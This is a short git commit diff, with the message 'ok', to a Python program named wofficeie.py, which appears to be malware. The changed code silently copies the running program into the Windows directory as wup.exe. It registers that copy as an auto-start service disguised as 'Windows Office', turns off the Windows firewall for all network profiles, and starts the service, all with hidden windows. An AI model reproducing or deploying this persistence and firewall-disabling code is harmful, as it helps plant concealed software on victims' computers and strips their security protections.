be25cbe98cc87f05a2fa6289f7d541fb9a3aeb1d
pistacchietto <pistacchietto2@gmail.com>
2017-09-02 16:05:38 +0200

    ok

--- wofficeie.py
+++ wofficeie.py
@@ -93,7 +93,8 @@ try:
         #while not os.path.exists('c:\\windows\\wup.exe'):
         #    time.sleep(5)
         #subprocess.call("move "+swin+'\\wofficeie.exe '+swin+'\\wup.exe', creationflags=0x08000000)
-        subprocess.call("cmd /c copy /y "+os.getcwd()+"\\wofficeie.exe " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
+        #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\wofficeie.exe " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("cmd /c copy /y "+sys.argv[0]+" " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
         subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
         subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
     subprocess.call("net start wup", creationflags=0x08000000)
